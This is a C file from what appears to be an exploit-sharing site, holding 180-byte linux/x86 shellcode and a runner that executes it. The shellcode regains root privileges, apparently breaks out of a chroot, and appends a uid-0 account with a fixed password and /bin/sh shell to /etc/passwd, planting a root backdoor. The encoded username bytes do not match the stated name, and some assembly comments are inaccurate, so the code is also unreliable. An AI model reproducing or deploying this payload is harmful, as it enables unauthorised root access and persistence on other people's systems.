/*
###
# Title : linux/x86 Add new User/Passwd - suid(0) - shellcode 180 bytes
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com (ked-h@1337day.com) | ked-h@exploit-id.com | kedans@facebook.com
# Home : Hassi.Messaoud (30500) - Algeria -(00213555248701)
# Web Site : www.1337day.com
# Facebook : http://facebook.com/KedAns 
# platform : linux/x86
# Type : shellcode / local exploit
# Size : 180 bytes
# Inf0 : Add neW User w!th passwd as r00t suid(0) .
###

##
# | >> --------+++=[ Dz Offenders Cr3w ]=+++-------- << |
# | > Indoushka * KedAns-Dz * Caddy-Dz * Kalashinkov3   |
# | Jago-dz * Over-X * Kha&miX * Ev!LsCr!pT_Dz * Dr.55h |
# | KinG Of PiraTeS * The g0bl!n * soucha * dr.R!dE  .. |
# | ------------------------------------------------- < |
###

*/


// User = Inj3ct0r
// Pass = r00t

#include <stdio.h>

char newuser[] =
   /* setreuid(0,0) */
   
   "\x31\xc9"   // xor %ecx,%ecx
   "\x31\xdb"   // xor %ebx,%ebx
   "\xf7\xe3"   // mul %ebx
   "\xb0\xa4"   // mov %al,$0xa4
   "\xcd\x80"   // int $0x80
   "\x31\xc9"   // xor %ecx,%ecx
   "\x31\xdb"   // xor %ebx,%ebx
   
   /* e0f */

   "\x6a\x46"   // push $0x46
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x31\xdb"   // xor %ebx,%ebx
   "\x6a\x17"   // push $0x17
   "\x58"       // pop %eax 
   "\xcd\x80"   // int $0x80
   "\x31\xc9"   // xor %ecx,%ecx
   "\x31\xdb"   // xor %ebx,%ebx
   "\x6a\x46"   // push $0x46
   "\x58"       // pop %eax 
   "\xcd\x80"   // int $0x80
   "\x6a\x3d"   // push $0x3d
   "\x89\xe3"   // mov %ebx,%esp
   "\x6a\x27"   // push $0x27
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x89\xd9"   // mov %ecx,%ebx
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x31\xc0"   // xor %eax,%eax
   "\x50"       // push %eax
   "\x66\x68\x2e\x2e"   // push $0x2e2e
   "\x89\xe3"   // mov %ebx,%esp
   "\x6a\x3d"   // push $0x3d
   "\x59"       // pop %ecx 
   "\xb0\x0c"   // mov %al,$0x0c
   "\xcd\x80"   // int $0x80
   "\xe2\xfa"   // loopd short
   "\x6a\x3d"   // push %0x3d
   "\x89\xd9"   // mov %ecx,%ebx
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x31\xc9"   // xor %ecx,%ecx
   "\x89\xcb"   // mov %ebx,%ecx
   "\x6a\x46"   // push $0x46
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x6a\x05"   // push $0x05
   "\x58"       // pop %eax 
   "\x31\xc9"   // xor %ecx,%ecx
   "\x51"       // push %ecx
   "\x68\x73\x73\x77\x64"  // push $0x64777373
   "\x68\x2f\x2f\x70\x61"  // push $0x61702f2f
   "\x68\x2f\x65\x74\x63"  // push $0x6374652f
   "\x89\xe3"   // mov %ebx,%esp
   "\x41"       // inc %ecx
   "\xb5\x04"   // mov %ch,$0x04
   "\xcd\x80"   // int %80
   "\x93"       // xchg %eax,%ebx
   "\xe8\x26\x00\x00\x00"  // call .me
   
   // Add User/Passwd + USR.Shell=/bin/sh
   
   /* inj3ct0r:AzXA.7JfdpHtA:0:0::/:/bin/sh */
   
   "\x69\x6e\x6a\x33\x63\x74"
   "\x72\x3a\x41\x7a\x58\x41"
   "\x2e\x37\x4a\x66\x64\x70"
   "\x48\x74\x41\x3a\x30\x3a"
   "\x30\x3a\x3a\x2f\x3a\x2f"
   "\x62\x69\x6e\x2f\x73\x68"
   
   /* e0f */
   
   "\x0a\x59\x8b" // or %bl,%ecx
   "\x51"       // push %ecx
   "\xfc"       // cld
   "\x6a\x04"   // push $0x04
   "\x58"       // pop %eax
   "\xcd\x80"   // int $0x80
   "\x6a\x01"   // push $0x01
   "\x58"       // pop %eax
   "\xcd\x80";   // int $0x80

int main()
{  
  printf("%d\n", strlen(newuser));
  (*(void (*)()) newuser)();
  return 0;
}
